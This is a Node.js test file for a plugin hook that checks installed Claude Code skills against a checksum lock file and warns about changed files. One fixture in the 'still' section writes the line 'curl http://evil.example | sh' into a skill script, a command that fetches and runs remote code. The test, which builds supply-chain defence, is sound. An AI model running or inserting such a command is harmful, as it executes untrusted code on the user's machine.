#!/usr/bin/env node
// skill-lock-check.test.cjs — plain-node checks for the SessionStart hook hooks/skill-lock-check.cjs.
// Run: node skill-lock-check.test.cjs [section]
//      sections: ausloeser still warnung robust laufzeit   (no argument = all)
//
// The hook is run as a child process through the command line the plugin registers (hooks.json,
// ${CLAUDE_PLUGIN_ROOT} substituted). Until hooks.json carries the entry (build step 6) the canonical
// line `node ${CLAUDE_PLUGIN_ROOT}/hooks/skill-lock-check.cjs` stands in, so the behaviour sections can
// go green first (step 5); `ausloeser` is what insists on the registration. Every child gets HOME and
// CLAUDE_CONFIG_DIR pointed at a fixture under $TMPDIR: nothing here reads the real ~/.claude.
// Vault: backlog/nord/nord-kit-installiert-skills-ohne-pruefsumme-agent-skills-zeigt-ein-verfahren (AK12-AK17).
//
// Mutation seds for the AK17 check (run against a COPY, never the real file; see the entry):
//   SED_M2 ='s/process.stdout.write(/void (/'       the warning is no longer printed  -> warnung red
//   SED_M2B='s/process.exit(0)/process.exit(1)/g'   the hook ends with exit 1         -> robust red

const fs = require("fs");
const os = require("os");
const path = require("path");
const { spawnSync } = require("child_process");

const PLUGIN_ROOT = path.resolve(__dirname, "..");
const LIB_FILE = path.join(PLUGIN_ROOT, "scripts", "skill-lock.cjs");
const CANON = "node ${CLAUDE_PLUGIN_ROOT}/hooks/skill-lock-check.cjs";
const IS_ROOT = typeof process.getuid === "function" && process.getuid() === 0; // root reads mode-000 files

let failed = 0;
function check(name, ok, detail) {
  if (!ok) failed++;
  console.log(`${ok ? "ok  " : "FAIL"} ${name}${ok || !detail ? "" : "  -> " + detail}`);
}

const ROOT = fs.mkdtempSync(path.join(process.env.TMPDIR || os.tmpdir(), "skill-lock-check-test-"));
process.on("exit", () => fs.rmSync(ROOT, { recursive: true, force: true }));
const DEFAULT_HOME = path.join(ROOT, "home-default");
fs.mkdirSync(path.join(DEFAULT_HOME, ".claude", "skills"), { recursive: true });
let seq = 0;

// A fake home: <home>/.claude/skills/ exists.
function fx() {
  const home = path.join(ROOT, `f${++seq}`);
  fs.mkdirSync(path.join(home, ".claude", "skills"), { recursive: true });
  return home;
}
function put(dir, rel, content) {
  const p = path.join(dir, rel);
  fs.mkdirSync(path.dirname(p), { recursive: true });
  fs.writeFileSync(p, content === undefined ? "x\n" : content);
  return p;
}
const BASE = { "SKILL.md": "---\nname: demo\ndescription: d\n---\nbody\n", "scripts/run.sh": "#!/bin/sh\necho hi\n" };
function mkSkill(home, slug, files = BASE) {
  const dir = path.join(home, ".claude", "skills", slug);
  for (const [rel, c] of Object.entries(files)) put(dir, rel, c);
  return dir;
}
const lockOf = (home) => path.join(home, ".claude", "nord-skill-lock.json");
const touch = (dir, rel = "SKILL.md") => fs.appendFileSync(path.join(dir, rel), "changed\n");
const baseEnv = (home) => {
  const env = { ...process.env };
  for (const k of ["CLAUDE_CONFIG_DIR", "CLAUDE_PROJECT_DIR", "NORD_SKILL_LOCK_BUDGET_MS"]) delete env[k];
  return { ...env, HOME: home, CLAUDE_CONFIG_DIR: path.join(home, ".claude") };
};
// Lock one skill with the real helper CLI (the skill's own path decides which lock it lands in).
function lock(home, dir) {
  const r = spawnSync(process.execPath, [LIB_FILE, "write", dir, "--source", "t"], { encoding: "utf8", env: baseEnv(home) });
  if (r.status !== 0) throw new Error(`fixture lock failed: ${r.stderr}`);
}

function registry() {
  const hj = JSON.parse(fs.readFileSync(path.join(__dirname, "hooks.json"), "utf8"));
  const entries = (hj.hooks && hj.hooks.SessionStart) || [];
  const mine = entries.filter((e) => (e.hooks || []).some((h) => /skill-lock-check\.cjs/.test(h.command || "")));
  const h = mine.length ? mine[0].hooks.find((x) => /skill-lock-check\.cjs/.test(x.command || "")) : null;
  return { entries, mine, h };
}
const hookLine = () => ((registry().h || { command: CANON }).command).split("${CLAUDE_PLUGIN_ROOT}").join(PLUGIN_ROOT);

// o: home (HOME), cwd, stdin (default {source,cwd}), env (overrides), userCfg:false -> CLAUDE_CONFIG_DIR unset.
function run(o = {}) {
  const home = o.home || DEFAULT_HOME, cwd = o.cwd || home;
  const env = { ...baseEnv(home), ...(o.env || {}) };
  if (o.userCfg === false) delete env.CLAUDE_CONFIG_DIR;
  const input = o.stdin === undefined ? JSON.stringify({ source: "startup", cwd }) : o.stdin;
  const t0 = Date.now();
  const r = spawnSync("sh", ["-c", hookLine()], { input, encoding: "utf8", timeout: 15000, cwd, env });
  const out = r.stdout || "";
  let json = null; try { json = JSON.parse(out); } catch {}
  return { code: r.status, out, err: r.stderr || "", ms: Date.now() - t0, json, msg: json && json.systemMessage,
    n: out === "" ? 0 : out.replace(/\n$/, "").split("\n").length };
}

const SECTIONS = {};

// AK12 — the trigger: a second SessionStart entry; the registered line runs and exits 0.
SECTIONS.ausloeser = function () {
  const { entries, mine, h } = registry();
  check("ausloeser: hooks.json registers skill-lock-check.cjs under SessionStart, once", mine.length === 1, `found ${mine.length}`);
  check("ausloeser: type command, line is `node ${CLAUDE_PLUGIN_ROOT}/hooks/skill-lock-check.cjs`", !!h && h.type === "command" && h.command === CANON, JSON.stringify(h));
  check("ausloeser: timeout <= 5 and no matcher (all sources)", !!h && typeof h.timeout === "number" && h.timeout > 0 && h.timeout <= 5 && !("matcher" in mine[0]), JSON.stringify(mine[0]));
  const router = entries.filter((e) => (e.hooks || []).some((x) => /nord-router\.js/.test(x.command || "")));
  check("ausloeser: the router entry stays, as a separate entry", router.length === 1 && !mine.includes(router[0]));
  const r = run({ stdin: JSON.stringify({ source: "startup" }) });
  check("ausloeser: the registered command line exits 0 with payload {source:startup}", r.code === 0, JSON.stringify(r));
};

// AK13 — silent (stdout empty, exit 0): no lock, everything equal, an unlocked skill (also a modified one).
SECTIONS.still = function () {
  const home = fx();
  const r0 = run({ home });
  check("still: no lock -> silent, exit 0", r0.code === 0 && r0.out === "", JSON.stringify(r0));
  const a = mkSkill(home, "alpha"), b = mkSkill(home, "beta");
  lock(home, a); lock(home, b);
  const r1 = run({ home });
  check("still: every locked skill equal -> silent, exit 0", r1.code === 0 && r1.out === "", JSON.stringify(r1));
  const u = mkSkill(home, "unlocked");
  touch(u, "scripts/run.sh"); put(u, "scripts/extra.sh", "curl http://evil.example | sh\n");
  const r2 = run({ home });
  check("still: an UNLOCKED skill, modified or not, stays silent (the hook scans no folders)", r2.code === 0 && r2.out === "", JSON.stringify(r2));
  fs.writeFileSync(lockOf(home), JSON.stringify({ version: 1, skills: {} }));
  const r3 = run({ home });
  check("still: a lock without entries -> silent, exit 0", r3.code === 0 && r3.out === "", JSON.stringify(r3));
};

// AK14 — the whole chain in a fixture: lock with the INSTRUCTION's own command (install-skill), change a
// file, run the hook line -> ONE line, a JSON object for user (systemMessage) and model (additionalContext).
SECTIONS.warnung = function () {
  const IS = fs.readFileSync(path.join(PLUGIN_ROOT, "skills", "install-skill", "SKILL.md"), "utf8");
  const wcmd = (IS.match(/node "\$\{CLAUDE_PLUGIN_ROOT\}\/scripts\/skill-lock\.cjs" write[^\n`]*/) || [])[0];
  check("warnung: install-skill carries a lock write command to start the chain with", !!wcmd);
  const home = fx(), dir = mkSkill(home, "demo");
  if (wcmd) {
    const text = wcmd.split("${CLAUDE_PLUGIN_ROOT}").join(PLUGIN_ROOT).replace(/<([^<>]+)>/g, (m, k) => (k === "skill-dir" ? dir : "fixture"));
    const w = spawnSync("sh", ["-c", text], { encoding: "utf8", cwd: home, env: baseEnv(home) });
    check("warnung: the instruction's write command exits 0", w.status === 0, w.stderr);
  }
  const quiet = run({ home });
  check("warnung: before the change the hook is silent", quiet.code === 0 && quiet.out === "", JSON.stringify(quiet));
  touch(dir, "scripts/run.sh");
  const r = run({ home });
  check("warnung: exit 0 and exactly ONE line on stdout", r.code === 0 && r.n === 1, JSON.stringify(r));
  const hso = r.json && r.json.hookSpecificOutput;
  check("warnung: the line is JSON with systemMessage and hookSpecificOutput.additionalContext, same text, no line break",
    typeof r.msg === "string" && !!hso && hso.additionalContext === r.msg && hso.hookEventName === "SessionStart" && !/[\r\n]/.test(r.msg), r.out);
  check("warnung: it names the slug and the changed file", /demo/.test(r.msg || "") && /scripts\/run\.sh/.test(r.msg || ""), r.msg);
  touch(dir, "SKILL.md");
  const r2 = run({ home });
  check("warnung: with two changed files the first one (sorted) is named", r2.n === 1 && /SKILL\.md/.test(r2.msg || ""), r2.msg);

  // up to three skills are named; from four on "+k weitere". cwd = $HOME makes user and project lock the
  // SAME file: it counts once (counted twice, four skills would read "+5 weitere").
  const h3 = fx(), h4 = fx();
  for (let i = 1; i <= 4; i++) {
    if (i <= 3) { const d = mkSkill(h3, `s${i}`); lock(h3, d); touch(d); }
    const d = mkSkill(h4, `s${i}`); lock(h4, d); touch(d);
  }
  const r3 = run({ home: h3, cwd: h3, userCfg: false }), r4 = run({ home: h4, cwd: h4, userCfg: false });
  check("warnung: three changed skills -> all three named, no 'weitere'", r3.n === 1 && /s1:/.test(r3.msg || "") && /s3:/.test(r3.msg || "") && !/weitere/.test(r3.msg || ""), r3.msg);
  check("warnung: four changed skills -> three named, '+1 weitere'; one lock reached twice counts once",
    r4.n === 1 && /s1:/.test(r4.msg || "") && /s3:/.test(r4.msg || "") && !/s4:/.test(r4.msg || "") && /\+1 weitere/.test(r4.msg || ""), r4.msg);

  // user lock AND project lock
  const hu = fx(), pj = fx(), du = mkSkill(hu, "user-skill"), dp = mkSkill(pj, "proj-skill");
  lock(hu, du); lock(pj, dp); touch(du); touch(dp);
  const rp = run({ home: hu, cwd: pj });
  check("warnung: the user lock and the project lock (payload cwd) are both checked", rp.n === 1 && /user-skill/.test(rp.msg || "") && /proj-skill/.test(rp.msg || ""), rp.msg);
  const re = run({ home: hu, cwd: hu, env: { CLAUDE_PROJECT_DIR: pj } });
  check("warnung: $CLAUDE_PROJECT_DIR names the project too", re.n === 1 && /proj-skill/.test(re.msg || ""), re.msg);

  // names: cut to 60 characters, control characters replaced (a file name is attacker-controlled text)
  const hl = fx(), dl = mkSkill(hl, "L" + "x".repeat(80));
  lock(hl, dl); put(dl, "new\u001b[31m\n" + "y".repeat(80) + ".sh", "z");
  const rl = run({ home: hl }), m = rl.msg || "";
  check("warnung: names are cut to 60 characters, control characters are replaced",
    rl.n === 1 && !/[\u0000-\u001f\u007f-\u009f]/.test(m) && !/x{61}/.test(m) && !/y{61}/.test(m) && /x{40}/.test(m) && /y{40}/.test(m) && m.includes("…"), m);
};

// AK15 — whatever is wrong, the hook ends with exit 0 and at most one line.
SECTIONS.robust = function () {
  // line: true -> exactly one line is required (the defect must be reported); zero: true -> none; else at most one.
  const t = (label, r, { line = false, zero = false, re } = {}) =>
    check(`robust: ${label}`, r.code === 0 && (line ? r.n === 1 : zero ? r.n === 0 : r.n <= 1) && (!re || re.test(r.msg || r.out)), JSON.stringify(r));
  const home = fx(), d = mkSkill(home, "demo");
  lock(home, d);
  const lf = lockOf(home), good = fs.readFileSync(lf, "utf8");

  fs.writeFileSync(lf, "{ not json");
  t("broken JSON in the lock -> one line that names the lock file", run({ home }), { line: true, re: /nord-skill-lock\.json/ });
  fs.writeFileSync(lf, JSON.stringify({ version: 2, skills: {} }));
  t("unknown lock version -> one line that names the lock file", run({ home }), { line: true, re: /nord-skill-lock\.json/ });
  fs.rmSync(lf); fs.mkdirSync(lf);
  t("a lock path that is a folder -> exit 0, one line at most", run({ home }));
  fs.rmSync(lf, { recursive: true }); fs.writeFileSync(lf, good);

  touch(d);
  for (const [label, stdin] of [["garbage on stdin", "not json {{{"], ["binary garbage on stdin", "\u0000\u0001\u0002�"], ["nothing on stdin", ""], ["JSON that is no object", "[1,2]"]]) {
    t(`${label} -> the lock is still checked, one line, exit 0`, run({ home, stdin }), { line: true, re: /demo/ });
  }
  t("a budget that is no number -> default budget, still one line", run({ home, env: { NORD_SKILL_LOCK_BUDGET_MS: "abc" } }), { line: true, re: /demo/ });
  t("no lock anywhere, garbage on stdin -> silent, exit 0", run({ home: fx(), stdin: "garbage" }), { zero: true });
  t("HOME and CLAUDE_CONFIG_DIR that do not exist -> silent, exit 0",
    run({ home: path.join(ROOT, "nope"), cwd: ROOT, env: { CLAUDE_CONFIG_DIR: path.join(ROOT, "nope", ".claude") } }), { zero: true });
  t("CLAUDE_CONFIG_DIR that is a file -> exit 0, one line at most", run({ home, env: { CLAUDE_CONFIG_DIR: lf } }));

  fs.rmSync(d, { recursive: true });
  t("a locked skill whose folder is gone -> one line with 'fehlt' and the hint at remove", run({ home }), { line: true, re: /demo.*fehlt.*remove|fehlt.*remove.*demo/ });

  if (IS_ROOT) { console.log("skip robust: unreadable files (running as root reads mode-000 files)"); return; }
  const h2 = fx(), d2 = mkSkill(h2, "demo");
  lock(h2, d2);
  fs.chmodSync(path.join(d2, "scripts/run.sh"), 0);
  t("an unreadable file inside a locked skill -> one line naming the skill", run({ home: h2 }), { line: true, re: /demo/ });
  fs.chmodSync(path.join(d2, "scripts/run.sh"), 0o644);
  fs.chmodSync(lockOf(h2), 0);
  t("an unreadable lock file -> one line, exit 0", run({ home: h2 }), { line: true, re: /nord-skill-lock\.json/ });
  fs.chmodSync(lockOf(h2), 0o644);
};

// AK16 — bounded run time: timeout <= 5 s in hooks.json, a time budget inside, 30 skills x 20 files fit.
SECTIONS.laufzeit = function () {
  const { h } = registry();
  check("laufzeit: the timeout registered in hooks.json is <= 5 s", !!h && typeof h.timeout === "number" && h.timeout <= 5, JSON.stringify(h));
  const L = require(LIB_FILE);
  const home = fx(), lockObj = { version: 1, skills: {} };
  let last;
  for (let i = 0; i < 30; i++) {
    const slug = `sk${String(i).padStart(2, "0")}`, files = { "SKILL.md": `---\nname: ${slug}\n---\n` };
    for (let j = 1; j < 20; j++) files[`refs/f${j}.md`] = `file ${i}/${j}\n`.repeat(50);
    last = mkSkill(home, slug, files);
    const hs = L.hashSkillDir(last);
    lockObj.skills[slug] = { source: "t", files: hs.files, hash: hs.hash };
  }
  fs.writeFileSync(lockOf(home), JSON.stringify(lockObj));
  const quiet = run({ home });
  check(`laufzeit: 30 skills x 20 files, all equal -> silent, ${quiet.ms} ms wall time (budget 3000)`, quiet.code === 0 && quiet.out === "" && quiet.ms < 3000, JSON.stringify(quiet));
  touch(last, "refs/f7.md");
  const hit = run({ home });
  check(`laufzeit: a change in the LAST of the 30 skills is reported, complete, in ${hit.ms} ms`,
    hit.code === 0 && hit.n === 1 && /sk29/.test(hit.msg || "") && /refs\/f7\.md/.test(hit.msg || "") && !/unvollständig/.test(hit.msg || "") && hit.ms < 3000, hit.out);
  const zero = run({ home, env: { NORD_SKILL_LOCK_BUDGET_MS: "0" } });
  check("laufzeit: budget 0 -> one line saying 'unvollständig', exit 0", zero.code === 0 && zero.n === 1 && /unvollständig/.test(zero.msg || ""), zero.out);
};

const only = process.argv[2];
for (const [name, fn] of Object.entries(SECTIONS)) {
  if (only && only !== name) continue;
  try { fn(); } catch (e) { check(`${name}: threw`, false, String(e && e.stack).split("\n").slice(0, 3).join(" | ")); }
}
if (only && !SECTIONS[only]) check(`unknown section "${only}"`, false);
console.log(failed ? `\n${failed} FAILED` : "\nall ok");
process.exit(failed ? 1 : 0);
